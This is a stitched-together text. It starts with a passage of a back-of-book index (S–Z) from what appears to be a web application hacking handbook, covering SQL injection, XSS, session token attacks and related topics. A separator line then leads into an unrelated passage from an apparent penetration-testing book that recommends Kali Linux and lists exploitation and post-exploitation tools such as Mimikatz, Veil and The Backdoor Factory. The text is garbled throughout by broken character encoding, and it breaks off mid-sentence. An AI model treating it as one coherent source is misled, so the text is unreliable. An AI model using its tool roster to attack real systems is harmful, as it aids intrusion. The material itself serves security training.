‚Äúremember me‚Äù function, 437
steps, 436‚Äì437
stored XSS compared to, 
439‚Äì440
user input testing, 453
script introduction, 454‚Äì455
register_globals directive, 
733
‚Äúreject known bad‚Äù approach, 
input, 23‚Äì24
RemembeMe cookie, 407‚Äì408
‚Äúremember me‚Äù functions
application logic fl aws, 
encryption oracle, 407
authentication, 175‚Äì176, 193
hacker‚Äôs methodology, 808
cookies, 175‚Äì176
encrypting, 177
refl ected XSS, 437
remote attackers, 427
remote black-box testing, 427
remote fi le inclusion, 381‚Äì382
fl aw testing, 383
remoting, 70
representational state transfer 
(REST), URLs, 44‚Äì45
spidering, 74‚Äì75
request forgery
CSRF, 8, 244, 504‚Äì511
anti-CSRF tokens, 508‚Äì509, 
516‚Äì517
authentication, 507‚Äì508
exploiting fl aws, 506‚Äì507
hacker‚Äôs methodology, 820
preventing fl aws, 508‚Äì510
real-world fl aws, 505
session management, 251
XSS defeating anti-CSRF 
tokens, 510‚Äì511
OSRF, 502‚Äì503
request headers, 45‚Äì46
‚Äúrequest in browser,‚Äù Burp Suite, 
272‚Äì273
request macros, Burp Suite, 
604‚Äì606
response headers, 46
REST. See representational state 
transfer
reverse strokejacking, 560
rickrolling attacks, 541
Rios, Billy, 485
robots.txt, 74
role-based access control 
(RBAC), 282
rolling your own insurance, 
application logic fl aws, 
412‚Äì413
Ruby on Rails (Ruby), 55
WEBrick, 690
S
safe data handling approach, 
input, 25
‚Äúsafe for scripting‚Äù registration, 
ActiveX controls, 555‚Äì557
safe_mode directive, 733‚Äì734
same-origin policy, 524‚Äì525
browser extensions, 525‚Äì527
Flash, 525‚Äì526
Java, 527
Silverlight, 526‚Äì527
hacker‚Äôs methodology, 851‚Äì852
HTML5, 528‚Äì529
web functionality, 64
sanitization approach, input, 
24‚Äì25
sanitizing fi lters, 468‚Äì471
scanning. See vulnerability 
scanners
Schuh, Justin, 634
ScreenName cookie, 407‚Äì408
scripts. See also cross-site 
scripting
deliberate backdoor, 660‚Äì661
enumerating identifi ers, 
576‚Äì577
error messages, 616‚Äì617
hacker‚Äôs toolkit custom, 
786‚Äì789
Curl, 788
Netcat, 788‚Äì789
Stunnel, 789
Wget, 788
HTML form validation, 
129‚Äì131
injection
hacker‚Äôs methodology, 835
preventing vulnerabilities, 
368
refl ected XSS user input testing 
to introduce, 454‚Äì455
session token attacker, 217
script code
bypassing fi lters, 465‚Äì468
dot character alternatives, 
466
dynamically constructed 
strings, 466
encoding, 468
eval function alternatives, 
466
JavaScript escaping, 465‚Äì466
multiple technique 
combination, 466‚Äì467
VBScript, 467
VBScript and JavaScript, 
467‚Äì468
HTML introducing
dynamically evaluated CSS 
styles, 459
event handlers, 457‚Äì458
script pseudo-protocols, 458
scripttags, 457
script pseudo-protocols, 458
search engines
error messages, 623
inference, 626
public information, 89
queries, 90
search function
application logic fl aws, 422‚Äì
424, 429
stored XSS, 439
SEARCH method, 679
secondary challenge
login function, 173, 200
password recovery, 200
second-order SQL injection, 
313‚Äì314
bindex.indd 871 bindex.indd 871 8/19/2011 12:01:37 PM 8/19/2011 12:01:37 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 872
872 Index n S‚ÄìS
second-order XSS. See stored XSS
secret questions, login function, 
189
Secure Socket Layer (SSL)
client-side certifi cation, 138
communication protection, 192
hacker‚Äôs methodology check 
for weak ciphers, 851
HTTP tunneled over, 49
security, 7‚Äì8
session tokens, 233
vulnerabilities of, 8
security. See also defense 
mechanisms
access controls, 278‚Äì283
best practices, 279‚Äì280
central component approach, 
280
multilayered privilege 
model, 280‚Äì283
pitfalls, 278‚Äì279
application logic fl aws, 428
ASP.NET
confi guration, 723‚Äì724
ViewState, 155
ASPs, 665‚Äì667
component segregation, 667
customer access, 665‚Äì666
customer functionality 
segregation, 666
authentication, 191‚Äì201
brute-force attack prevention, 
196‚Äì199
subtleties, 195
client-side, 431‚Äì432
client-side data transmission, 
154‚Äì156
logging and alerting, 156
validation, 155
evolution, 432
hardening, 695‚Äì696
HTTP headers and 
assumptions with, 123
Java confi guration, 716‚Äì717
media focus on, 432
Microsoft, 431‚Äì432
myths, 433
PCI standards, 7
Perl language confi guration, 
739‚Äì740
PHP confi guration, 732‚Äì735
magic_quotes-gpc
directive, 734
register_globals
directive, 733
safe_mode directive, 
733‚Äì734
questions, 650
reputation, 1
session management, 248‚Äì254
shared hosting, 665‚Äì667
component segregation, 667
customer access, 665‚Äì666
customer functionality 
segregation, 666
SSL, 7‚Äì8
tiered architectures, 654‚Äì656
time and resources impacting, 
11
token generation, 210
underdeveloped awareness 
of, 10
web application, 1, 6‚Äì15
attackers, 6
developer understanding, 3
future, 14‚Äì15
key factors, 10‚Äì12
new network perimeter for, 
12‚Äì14
user input threatening, 9‚Äì10
vulnerabilities, 7‚Äì8
web server
confi guration, 684
software, 695‚Äì697
website evolution and, 2
XSS, evolution, 433
SELECT NULL value, UNION
operator, 306‚Äì307
SELECT queries, UNION operator, 
304‚Äì305
SELECT statements
SQL injection, 294‚Äì295
WHERE clause, 321
self-registration, usernames, 
182, 196
semantic checks, input, 25
semicolon character, batch 
function, 363
serialization, 70
serialized data
browser extensions 
intercepting data 
transmission, handling, 
136‚Äì138
Java, 136‚Äì137
Flash, 137‚Äì138
Silverlight, 138
server error messages, 619‚Äì622
Server header, 42
server-executable fi les, 382
servers. See web servers
server-side
API redirection, 392
functionality
application mapping 
identifying, 106‚Äì110
ASP.NET, 54, 103
dissecting requests, 107‚Äì108
Java, 53‚Äì54
PHP, 54‚Äì55
Ruby on Rails, 55
SQL, 55‚Äì56
web application behavior 
extrapolation, 109‚Äì110
web application behavior 
isolation, 110
web services, 56‚Äì57
XML, 56
HTTP redirection, 390‚Äì392
exploiting, 391‚Äì392
technologies
application mapping 
identifying, 101‚Äì106
banner grabbing, 101
directory names, 105
fi le extensions, 102‚Äì105
HTTP fi ngerprinting, 102
session tokens, 105
third-party code 
components, 105
sessions
ASP.NET, 719‚Äì720
fi xation
cookie injection, 537‚Äì540
fi nding and exploiting, 
539‚Äì540
preventing, 540
steps, 537‚Äì538
hacker‚Äôs methodology
fi xation, 819
terminating, 818‚Äì819
hacker‚Äôs methodology, 
application mapping, 
tokens to, 818
hijacking, 436
HTTP authentication 
alternative to, 208‚Äì209
Java, 712‚Äì713
Perl language, 736
PHP, 727
standalone vulnerability 
scanners handling, 
778‚Äì779
state information managed 
without, 209
termination, 241‚Äì243
reactive, 253‚Äì254
web functionality, 66
session management. See also
access controls
alerts, 253
application logic fl aws, 429
attackers, 20
cookies, liberal scope, 244‚Äì248
bindex.indd 872 bindex.indd 872 8/19/2011 12:01:37 PM 8/19/2011 12:01:37 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 873
 Index n S‚ÄìS 873
CSRF, 251
defense mechanisms handling 
access with, 19‚Äì20
duration, 241‚Äì243
hacker‚Äôs methodology
token insecure transmission, 
817
token system log disclosure, 
817‚Äì818
tokens tested for meaning, 
815‚Äì816
tokens tested for 
predictability, 816‚Äì817
understanding, 814‚Äì815
logging, 253
login function, 206
logout function, 242, 250
monitoring, 253
security, 248‚Äì254
state information, 206‚Äì209
tokens
algorithm generating, 249
attacker scripts, 217
client-side exposure to 
hijacking of, 243‚Äì244
concealed sequences, 213‚Äì215
eavesdroppers, 234
encrypting, 223‚Äì233
HTTP cookies, 207‚Äì208, 
234‚Äì236
HTTPS, 234‚Äì236, 250
life cycle protection, 250‚Äì253
login function, 539‚Äì540
meaningful, 210‚Äì212
network disclosure, 234‚Äì237
per-page, 252‚Äì253
predictable, 213‚Äì223
server-side technology, 105
SSL, 233
strength, 248‚Äì249
system log disclosure, 
237‚Äì239
time dependency, 215‚Äì217
transmitting, 538
URL transmission, 250
in URLs, 237‚Äì238
vulnerable mapping of, 
240‚Äì241
weak random number 
generation, 218‚Äì219
weak random number 
quality testing, 219‚Äì223
weakness in generating, 
210‚Äì233
weakness in handling, 
233‚Äì248
XSS vulnerabilities, 243‚Äì244
uses, 205
session riding. See request 
forgery
session-handling mechanisms
Burp Suite
cookie jar, 603‚Äì604
request macros, 604‚Äì606
session-handling rules, 
606‚Äì609
session-handling tracer, 609
supporting, 603‚Äì609
customized automation, 
602‚Äì609
session-handling rules, 606‚Äì609
session-handling tracer, 609
SessionID parameter, 590
Set-Cookie header, 42, 47, 242, 
244‚Äì245, 531
enumerating identifi ers, 575
setString method, 340
shared hosting, 656‚Äì657. See also
cloud computing
attackers, 658‚Äì665
access, 658‚Äì660
deliberate backdoor scripts, 
660‚Äì661
between web applications, 
660‚Äì663
hacker‚Äôs methodology, 845‚Äì846
securing, 665‚Äì667
component segregation, 667
customer access, 665‚Äì666
customer functionality 
segregation, 666
threats, 657
virtual hosting, 657
shared token analyzers, 
integrated testing suites, 767
shared usernames, 181
shell metacharacters, 359‚Äì360
application logic fl aws, 419
OS command injection, 363, 
365
Perl language, 360
types, 363
The Shellcoder‚Äôs Handbook (Anley 
& Heasman & Linder), 634
Shift-JIS character set, 464‚Äì465
shutdown command, 315
signature-based fi lters, refl ected 
XSS, 456‚Äì457
signedness errors, 641‚Äì642
Silverlight, 135
bytecode, 141
debuggers, 152
Isolated Storage, 553
same-origin policy, 526‚Äì527
serialized data, 138
Spy, 152
simple match conditions fi lter, 
350
Simple Object Access Protocol 
(SOAP), 57
functions, 386
injection, 386‚Äì388
banking application, 387‚Äì388
error messages, 388
fi nding and exploiting, 389
hacker‚Äôs methodology, 839
preventing, 27, 390
NBFS, 138
site map records, 769‚Äì771
SiteLock Active Template 
Library, Microsoft, 559
sleep function, MySQL, 323
smartcards, authentication, 206
SMTP injection, 397‚Äì402
fl aws, 400‚Äì401
hacker‚Äôs methodology, 836‚Äì837
preventing, 402
sniper attack, Burp Intruder, 592
SOAP. See Simple Object Access 
Protocol
sockets
ASP.NET API methods, 
723
Java, 716
Perl language API methods, 
739
PHP API methods, 732
source code
application logic fl aws, 428
backdoor password, 708
browsing, 743
buffer overfl ow, 709
bytecode recompiling
within browser, 142‚Äì143
outside browser, 143
comments, 710‚Äì711
decompiling browser 
extensions, 142‚Äì144
error messages, 623
format string vulnerabilities, 
710
integer vulnerabilities, 709‚Äì710
native software bugs, 709‚Äì710
open redirection 
vulnerabilities, 707‚Äì708
OS command injection, 708
path traversal vulnerabilities, 
706‚Äì707
review
approaches, 702‚Äì704
black-box versus white-box, 
702‚Äì703
methodology, 703‚Äì704
situations, 701
bindex.indd 873 bindex.indd 873 8/19/2011 12:01:37 PM 8/19/2011 12:01:37 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 874
874 Index n T‚ÄìT
signatures of common 
vulnerabilities, 704‚Äì711
SQL injection, 705‚Äì706
XSS, 704‚Äì705
spidering
REST URLs, 74‚Äì75
user-directed, 77‚Äì80
benefi ts, 77
hidden content discovery 
with, 81‚Äì83
web compared to, 79
web, 74‚Äì77
authentication, 76
integrated testing suites, 
760‚Äì762
user-directed spidering 
compared to, 79
SQL. See Structured Query 
Language
SQLMap, 322
sql-shell option, 330‚Äì331
SQLzoo.net, 292
SSL. See Secure Socket Layer
stack overfl ows, 634‚Äì635
stack traces
ASP.NET, 617
error messages, 617‚Äì618
standalone vulnerability 
scanners, 773‚Äì784
automated versus userdirected, 784
customized automation, 
780‚Äì781
dangerous effects, 779
individuating functionality, 
779‚Äì780
limitations, 776‚Äì777
products, 781‚Äì782
technical challenges, 778‚Äì781
authentication and session 
handling, 778‚Äì779
using, 783‚Äì784
vulnerabilities detected, 
774‚Äì776
vulnerabilities undetected, 775
state information
session management, 206‚Äì209
without sessions, 209
web functionality, 66
static resources
access controls, 263‚Äì264
account testing, 277
fi le inclusion, 382
naming schemes, 87
static tokens, 240
statistical hypothesis testing, 
219‚Äì222
status codes, HTTP, 48‚Äì49
enumerating identifi ers, 574
storage. See web storage, cloud 
computing
stored procedures
databases, 339
hacker‚Äôs methodology, 831‚Äì832
stored XSS, 438‚Äì440
attacker steps, 438‚Äì439
delivering, 449‚Äì450
e-mail testing, 483‚Äì484
fi nding and exploiting, 481‚Äì487
MySpace, 442‚Äì443, 446
preventing, 492‚Äì496
HTML limitations, 495‚Äì496
input insertion, 495
input validation, 492‚Äì493
output validation, 493‚Äì495
refl ected XSS compared to, 
439‚Äì440
search function, 439
uploaded fi les testing, 484‚Äì487
Ajax, 486‚Äì487
GIFAR fi les, 485‚Äì486
string data
dynamically constructed, 
script code bypassing 
fi lters, 466
manipulation, 316
SQL injection into, 298‚Äì299
string-length() function, 
348
strncpy function, 642
strokejacking, 511. See also user 
interface redress attacks
reverse, 560
Structured Query Language 
(SQL)
client-side injection, 547‚Äì548
comments, 312
injection, 7, 14
advanced exploitation, 
314‚Äì324
API methods, 291
application logic fl aws, 
420‚Äì422
blind, 626
bugs, 298‚Äì302
client-side, 547‚Äì548
column name, 301‚Äì302
conditional errors, 320‚Äì322
database code components, 
741‚Äì742
defense in depth, 342
DELETE statements, 297‚Äì298
double hyphen, 293
error messages, 334‚Äì338
exploitation tools, 328‚Äì331
fi lter bypassing, 311‚Äì313
fi ngerprinting databases, 
303‚Äì304
hacker‚Äôs methodology, 
827‚Äì829
inference, 319‚Äì324
input validation 
circumvented, 312
INSERT statements, 295‚Äì296
JavaScript errors, 299
numeric data, 299‚Äì301, 
315‚Äì316
ORDER BY clause, 301‚Äì302
out-of-band channel, 316‚Äì319
parameterized queries, 
339‚Äì341
preventing, 27, 338‚Äì342
query structure, 301‚Äì302
second-order, 313‚Äì314
SELECT statements, 294‚Äì295
source code, 705‚Äì706
string data, 298‚Äì299
syntax, 332‚Äì334
time delays, 322‚Äì324
UNION operator, 304‚Äì308
UNION operator data 
extraction, 308‚Äì311
UPDATE statements, 296‚Äì297
URL encoding, 300‚Äì301
vulnerability exploitation, 
292‚Äì294
web functionality, 55‚Äì56
structured tokens, 210‚Äì212
Stunnel, 789
SUBSTR(ING) functions, 324
suspension of account, 197‚Äì198
.swf fi les, 141
syntactic validation, 25
system log disclosure
hacker‚Äôs methodology, session 
management, 817‚Äì818
session tokens, 237‚Äì239
vulnerabilities, 238
T
tag brackets, HTML bypassing 
fi lters, 462‚Äì464
tag name, HTML bypassing 
fi lters, 460‚Äì461
scripttags, 457
Tamper Data, 772
TamperIE, 772‚Äì773
TCP protocol, HTTP using, 40
testing. See account testing; 
hacker‚Äôs methodology; 
hacker‚Äôs toolkit; statistical 
hypothesis testing
third-party applications, 560‚Äì561
bindex.indd 874 bindex.indd 874 8/19/2011 12:01:37 PM 8/19/2011 12:01:37 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 875
 Index n U‚ÄìU 875
301 Moved Permanently, 48
302 Found, 48
brute-force techniques, 84
304 Not Modified, 48
tiered architectures, 647
attacks, 648‚Äì654
categories, 648‚Äì649
component segregation, 
655‚Äì656
defense in depth, 656
Java, 648
layers, 648
PHP, 653‚Äì654
securing, 654‚Äì656
subverting, 650‚Äì654
decryption algorithms, 650
local fi le inclusion executing 
commands, 652‚Äì654
MySQL extraction, 650‚Äì652
trust relationships, 649‚Äì650
access, 649
minimize, 654‚Äì655
time
delays
enumerating identifi ers, 
575‚Äì576
Oracle databases, 323‚Äì324
OS command injection, 
363‚Äì364
SQL injection, 322‚Äì324
session token generation, 
215‚Äì217
time of check, time of use fl aw 
(TOCTOU fl aw), 505
TOCTOU fl aw. See time of check, 
time of use fl aw
tokens
anti-CSRF, 508‚Äì509
XSS defeating, 510‚Äì511
authentication, 160
Burp Sequencer testing 
randomness of, 219‚Äì221
cloud computing attackers, 665
encrypting, 223‚Äì233
attackers, 232‚Äì233
Burp Intruder bit fl ipper, 
228‚Äì231
CBC, 227‚Äì233
downloading, 231‚Äì232
ECB ciphers, 224‚Äì226
‚Äúreveal‚Äù encryption oracle, 
232
generating strong, 248‚Äì249
hacker‚Äôs methodology, 
application mapping, 
sessions to, 818
hacker‚Äôs methodology, session 
management
insecure transmission, 817
system log disclosure, 
817‚Äì818
tested for meaning, 815‚Äì816
tested for predictability, 
816‚Äì817
per-page, 252‚Äì253
session management
algorithm generating, 249
attacker scripts, 217
client-side exposure to 
hijacking of, 243‚Äì244
concealed sequences, 213‚Äì215
eavesdroppers, 234
encrypting, 223‚Äì233
HTTP cookies for, 207‚Äì208, 
234‚Äì236
HTTPS, 234‚Äì236, 250
life cycle protection, 250‚Äì253
login function, 539‚Äì540
meaningful, 210‚Äì212
network disclosure, 234‚Äì237
per-page, 252‚Äì253
predictable, 213‚Äì223
security, generation of, 210
server-side technologies, 105
strength, 248‚Äì249
system log disclosure, 
237‚Äì239
transmitting, 538
URL transmission, 250
in URLs, 237‚Äì238
vulnerable mapping of, 
240‚Äì241
weakness in generating, 
210‚Äì233
weakness in handling, 
233‚Äì248
XSS vulnerabilities, 243‚Äì244
shared analyzers, integrated 
testing suites, 767
SSL, 233
static, 240
structured, 210‚Äì212
time dependency, 215‚Äì217
weak random number 
generation, 218‚Äì219
weak random number quality 
testing, 219‚Äì223
TRACE functions, 43
transaction logic, 844
Trojan injection, XSS attack 
payloads, 444‚Äì445
trust relationships
hacker‚Äôs methodology, 
application logic fl aws, 
844
tiered architectures
access, 649
exploiting, 649‚Äì650
minimize, 654‚Äì655
XSS attack payloads exploiting, 
446‚Äì447
try-catch blocks, 30
200 OK, 48
201 Created, 48
U
UDFs. See user-defi ned functions
UI redress attacks. See user 
interface redress attacks
uid parameter, 584, 590
unhandled errors, 30‚Äì31
Unicode encoding, 67‚Äì68
Burp Intruder, 375
uniform resource identifi er 
(URI), 44
open redirection 
vulnerabilities, absolute 
prefi x, 545‚Äì546
uniform resource locator (URL)
account activation, 184
application mapping, input 
entry points, 98‚Äì99
buffer overfl ow and length 
of, 639
bytecode, 140
encoding, 67
SQL injection, 300‚Äì301
truncating, 378
format, 44
HTTP requests, 40, 44
open redirection 
vulnerabilities, 542
absolute prefi x, 545‚Äì546
blocking absolute, 544‚Äì545
parameters, client-side data 
transmission, 121‚Äì122
passwords recovery with timelimited, 174‚Äì175
redirection
ASP.NET API methods, 723
Java API methods, 716
Perl language API methods, 
738
PHP API methods, 731‚Äì732
REST, 44‚Äì45
spidering, 74‚Äì75
session tokens, 237‚Äì238, 250
translation attacks, 396‚Äì397
UNION operator
Boolean conditions, 329
error messages, 306
NULL value, 306‚Äì307
Oracle databases, 307‚Äì308
bindex.indd 875 bindex.indd 875 8/19/2011 12:01:37 PM 8/19/2011 12:01:37 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 876
876 Index n V‚ÄìW
provisos, 305‚Äì306
SELECT NULL value, 306‚Äì307
SELECT queries, 304‚Äì305
SQL injection, 304‚Äì308
data extraction, 308‚Äì311
UNIX
chrooted fi le system, 381
Windows path traversal 
vulnerabilities compared 
to, 374
UPDATE statements, 296‚Äì297
uploaded fi les, stored XSS 
testing, 484‚Äì487
Ajax, 486‚Äì487
GIFAR fi les, 485‚Äì486
URI. See uniform resource 
identifi er
URL. See uniform resource 
locator
US-ASCII, 464
user access. See access
user input. See also input
ASP.NET API methods for, 
718‚Äì719
client-side controls, 117
browser extensions, 133‚Äì153
hacker‚Äôs methodology, 
801‚Äì802
HTML forms, 127‚Äì133
Java, 711‚Äì712
API methods, 712
open redirection 
vulnerabilities, 543‚Äì544
path traversal vulnerabilities, 
379‚Äì380
Perl language, 735‚Äì736
PHP, 724‚Äì727
refl ected XSS testing, 453
script introduction, 454‚Äì455
web application security 
threatened by, 9‚Äì10
user interface redress attacks (UI 
redress attacks), 508, 511‚Äì515
basic form, 511‚Äì513
framebusting, 514‚Äì515
mobile devices, 515
preventing, 515
variations, 513
User-Agent header, 41, 52
targeting, 100
userData, IE, 554
user-defi ned functions (UDFs), 
328
user-directed spidering, 77‚Äì80
benefi ts, 77
hidden content discovery with, 
81‚Äì83
web spidering compared to, 79
_username buffer, 635‚Äì637
usernames
access controls attackers 
harvesting, 275‚Äì276
attackers, 168
e-mail address, 167, 196
enumeration, 166‚Äì169
hacker‚Äôs methodology, 
authentication
enumerating, 806‚Äì807
uniqueness, 809
nonunique, 181‚Äì182
password change functionality, 
172
predictable, 182‚Äì183, 197
self-registration, 182, 196
shared, 181
sources, 169
system-generated, 192
UTF-7, 464
UTF-16, 464‚Äì465
UTL-HTTP package, 317‚Äì318
V
ValidateForm function, 130
VALUES clause, 295‚Äì296
variable assignment, JavaScript 
hijacking, 522
VBScript
error messages, 616
script code bypassing fi lters, 
467
JavaScript with, 467‚Äì468
web functionality, 61
vendor patches, web servers, 695
verbose debugger messages, 425
verbose error message, 30‚Äì31, 
624
verbose failure messages, 
166‚Äì169
vertical access controls, 258
vertical privilege escalation, 
258, 416
ViewState, ASP.NET
attackers, 127
Base64 encoding, 125‚Äì126
Burp Suite, 126
client-side data transmission, 
124‚Äì127
purpose, 125
security, 155
virtual defacement, XSS attack 
payloads, 443‚Äì444
virtual hosting
Apache, 683
hacker‚Äôs methodology, web 
servers, 847‚Äì848
shared hosting, 657
web servers misconfi gured, 
683
virtual machines (VMs), 145
sandbox, 153
virtual private network (VPN), 
659
VMs. See virtual machines
VPN. See virtual private network
vulnerability scanners
integrated testing suites, 
764‚Äì765
standalone, 773‚Äì784
standalone, 773‚Äì784
automated versus userdirected, 784
customized automation, 
780‚Äì781
dangerous effects, 779
individuating functionality, 
779‚Äì780
limitations, 776‚Äì777
products, 781‚Äì782
technical challenges, 778‚Äì781
using, 783‚Äì784
vulnerabilities detected, 
774‚Äì776
vulnerabilities undetected, 
775
W
WAFs. See web application 
fi rewalls
WAITFOR command, MS-SQL, 
322‚Äì323
WAR fi les, 673‚Äì676
warez, distributing, 2
WayBack Machine, 89
WCF. See Windows 
Communication Foundation
weak passwords, 161‚Äì162
web 2.0, 14
vulnerabilities, 65
web application fi rewalls (WAFs)
bypassing, 698
hacker‚Äôs methodology, web 
servers, 848‚Äì849
NULL bytes, 460
web servers, 697‚Äì698
web applications. See also
hacker‚Äôs methodology; 
hacker‚Äôs toolkit
administrative functions in, 
35‚Äì36
bindex.indd 876 bindex.indd 876 8/19/2011 12:01:37 PM 8/19/2011 12:01:37 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 877
 Index n W‚ÄìW 877
ASP attackers between, 
660‚Äì663
behavior
extrapolating, 109‚Äì110
isolating, 110
benefi ts, 5‚Äì6
business, 4
cloud computing, 5
custom development, 10
data store reliance of, 287
deceptive simplicity, 10‚Äì11
evolution, 2‚Äì3
framework fl aws, 685‚Äì687
functions, 4‚Äì5
increasing demands on, 12
managing, 35‚Äì36
overextended, 11‚Äì12
pages, functional paths versus,
93‚Äì96
security, 1, 6‚Äì15
attackers, 6
developer understanding, 3
future, 14‚Äì15
key factors, 10‚Äì12
new network perimeter for, 
12‚Äì14
user input threatening, 9‚Äì10
vulnerabilities, 7‚Äì8
shared hosting attackers 
between, 660‚Äì663
technologies developing, 6
third-party, 560‚Äì561
threats to, 3
rapidly evolving, 11
XPath subverting logic of, 
345‚Äì346
web archives, public 
information, 89‚Äì90
web browsers. See also browser 
extensions; Firefox; Internet 
Explorer
attackers, 559‚Äì568
browsing history, 552
bugs, 563
capabilities, 5‚Äì6
DNS rebinding, 563‚Äì564
exploitation frameworks, 
564‚Äì566
BeEF, 565‚Äì566
XSS Shell, 566
hacker‚Äôs toolkit, 748‚Äì750
Chrome, 750
Firefox, 749‚Äì750
IE, 748‚Äì749
integrated testing suites, 
intercepting proxies 
confi guring, 752‚Äì755
XSS fi lters, 479‚Äì481
web container, Java, 53
web functionality
client-side, 57‚Äì65
Ajax, 62‚Äì63, 384
browser extension 
technologies, 65
CSS, 60‚Äì61
DOM, 62
forms, 58‚Äì60
HTML, 58
HTML5, 64‚Äì65
hyperlinks, 58
JavaScript, 61
JSON, 63
same-origin policy, 64
VBScript, 61
server-side, 51‚Äì57, 103, 106‚Äì110
ASP.NET, 54, 103
Java, 53‚Äì54
PHP, 54‚Äì55
Ruby on Rails, 55
SQL, 55‚Äì56
web services, 56‚Äì57
XML, 56
sessions, 66
state information, 66
web servers, 669‚Äì670
CMS, 92
confi guration
security, 684
vulnerabilities, 670‚Äì684
default content, 92, 671‚Äì677
debug functionality, 671‚Äì672
hacker‚Äôs methodology, 847
JMX, 674‚Äì676
powerful functions, 673‚Äì674
sample functionality, 672‚Äì673
default credentials, 670‚Äì671
hacker‚Äôs methodology, 846
directory listing, 677‚Äì679
Allaire JRun, 690‚Äì691
fl aws, 694
hacker‚Äôs methodology, 846‚Äì849
dangerous HTTP methods, 
847
default content, 847
default credentials, 846
native software bugs, 848
proxy server functionality, 
847
virtual hosting, 847‚Äì848
WAFs, 848‚Äì849
hidden content discovery 
leveraging, 91‚Äì93
JBoss Application Server, 
674‚Äì676
misconfi gured virtual hosting, 
683
Oracle, 676‚Äì677
as proxy servers, 682‚Äì683
software
Allaire JRun, 690‚Äì691
Apple iDisk Server, 690
defense in depth, 696‚Äì697
encoding and 
canonicalization, 
689‚Äì694
JVM, 690
memory management, 
687‚Äì689
Microsoft IIS path traversal 
vulnerabilities, 691‚Äì692
Oracle PL/SQL Exclusion 
List fi lter bypass, 
692‚Äì694
resources, 694
Ruby WEBrick, 690
securing, 695‚Äì697
security hardening, 695‚Äì696
vendor patches, 695
vulnerabilities, 684‚Äì697
vulnerabilities, 91‚Äì92
WAFs, 697‚Äì698
WebDAV methods, 679‚Äì681
web services, 56‚Äì57
Web Services Description 
Language (WSDL), 57
web spidering, 74‚Äì77
authentication, 76
integrated testing suites, 
760‚Äì762
user-directed spidering 
compared to, 79
web storage
cloud computing, 665
hacker‚Äôs methodology, 
authentication insecure, 
811
Web-based Distributed 
Authoring and Versioning 
(WebDAV)
overfl ows, 689
web server methods, 679‚Äì681
WebDAV. See Web-based 
Distributed Authoring and 
Versioning
WEBrick, Ruby, 690
websites
attacker-created, 448‚Äì449
evolution, 51
security and evolution of, 2
web.xml fi le, 716‚Äì717
Wget, 788
bindex.indd 877 bindex.indd 877 8/19/2011 12:01:37 PM 8/19/2011 12:01:37 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 878
878 Index n X‚ÄìZ
WHERE clause
DELETE statements, 297‚Äì298
INSERT statements, 295
SELECT statements, 321
UPDATE statements, 296‚Äì297
white-box code review, 702‚Äì703
whitelist-based fi lters, 24
wiki, brute-force techniques for 
passwords in, 424
Wikto, hidden content, 
92‚Äì93
Windows, UNIX path traversal 
vulnerabilities compared 
to, 374
Windows Communication 
Foundation (WCF), 138
Winter-Smith, Peter, 640
Wireshark, 236
Witko, 785
World Wide Web. See also
hypertext transfer protocol; 
web functionality
evolution, 2‚Äì3, 15
overextended technologies in, 
11‚Äì12
WSDL. See Web Services 
Description Language
X
.xap fi les, 141
X-Frame-Options header, 
515
XHTML, 58
XML. See Extensible Markup 
Language
XML external entity injection 
(XXE injection), 384‚Äì386
hacker‚Äôs methodology, 
841
XML Path Language (XPath)
count() function, 348
injection, 344‚Äì349
blind, 347‚Äì348
fl aws, 348‚Äì349
hacker‚Äôs methodology, 
840‚Äì841
informed, 346‚Äì347
preventing, 349
keywords, 346
string-length() function, 
348
subverting web application 
logic, 345‚Äì346
XMLHttpRequest, 62‚Äì63, 476, 
524
attackers, 529
cross-domain requests, 
528‚Äì529
XPath. See XML Path Language
XSS. See cross-site scripting
XSS Shell, 566
XXE injection. See XML external 
entity injection
Z
.zip extension, 141
------------------------------------------------------------------------------------------------------------------


Kali Linux
(https://www.kali.org/)
For those who have never used Kali Linux, it is often seen as the standard in offensive penetration
testing. This Debian-based Linux distro contains a wealth of different security tools all preconfigured
into a single framework. This is a great starting point for your offensive security platform and the
book mainly builds off of this Linux distribution. I highly recommend that you download the virtual
machine and use this for your testing.
Back Box
(http://www.backbox.org/)
Although Kali Linux is seen as the standard, it is best to not ever rely on a single tool/OS/process‚Äîthis will be a constant theme throughout the book. The developers could stop supporting a certain tool
or, even worse, you begin to experience tunnel vision and rely on old methods. The guys over at Back
Box are doing great work building and supporting another security platform. The main differences I
can see is that Back Box is based on Ubuntu and more importantly, comes with default user rights
management (instead of everyone running as root in Kali Linux). Some people are more comfortable
with Ubuntu and I have gotten into situations where specific tools are developed for and run more
stable on Ubuntu versus Kali. Again, it should be just another tool available at your reach and it is
good to know what is out there.
Setting Up Your Boxes
There are many tools that are not included or that need to be modified from the stock tool set in any of
the security distributions (distro). I like to put them in a directory where I know where they exist and
can be used easily. Here are the tools that you will need to install.
Recon/Scanning Tools
‚óè Discover
‚óè EyeWitness
‚óè HTTPScreenShot
‚óè WMAP
‚óè SpiderFoot
‚óè Masscan
‚óè Gitrob
‚óè CMSmap
‚óè Recon-ng
‚óè SPARTA
‚óè WPScan
‚óè Password Lists
Exploitation
‚óè Burp Suite Pro
‚óè ZAP Proxy Pro
‚óè NoSQLMap
‚óè SQLMap
‚óè SQLNinja
‚óè BeEF Exploitation Framework
‚óè Responder
‚óè Printer Exploits
‚óè Veil
‚óè WIFIPhisher
‚óè Wifite
‚óè SET
Post Exploitation
‚óè Hacker Playbook 2 - Custom Scripts
‚óè SMBexec
‚óè Veil
‚óè WCE
‚óè Mimikatz
‚óè PowerSploit
‚óè Nishang
‚óè The Backdoor Factory
‚óè DSHashes
‚óè Net-Creds
Setting Up Kali Linux
There are many different ways you can set up your attacker host, but I want you to be able to mimic
all of the examples in this book. Before going on, you should try to configure your host with the
settings below. Remember that tools do periodically change and that you might need to make small
tweaks to these settings or configurations. (Don‚Äôt forget to check the updates page at
http://www.thehackerplaybook.com). For those users that have only purchased the physical book, I
have copied the whole settings and software section to my Github
(http://www.github.com/cheetz/thp2). This should make copying and pasting much easier, so you
don‚Äôt have to type each command in by hand.
Since this book is based off of the Kali Linux platform, you can download the Kali Linux distro from:
http://www.kali.org/downloads/. I highly recommend you download the VMware image
(https://www.offensive-security.com/kali-linux-vmware-arm-image-download/) and download
